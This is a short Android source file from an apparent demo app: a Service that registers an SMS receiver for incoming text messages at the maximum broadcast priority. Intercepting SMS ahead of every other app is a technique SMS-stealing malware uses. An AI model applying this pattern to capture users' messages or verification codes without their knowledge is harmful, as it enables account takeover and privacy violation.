package com.demo.sms;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public final class MyService extends Service {

	@Override
	public void onCreate() {
		super.onCreate();
		
		IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
		filter.setPriority(Integer.MAX_VALUE);
		registerReceiver(new SmsReceiver(), filter);
	}
	
	@Override
	public IBinder onBind(Intent paramIntent) {
		return null;
	}

}
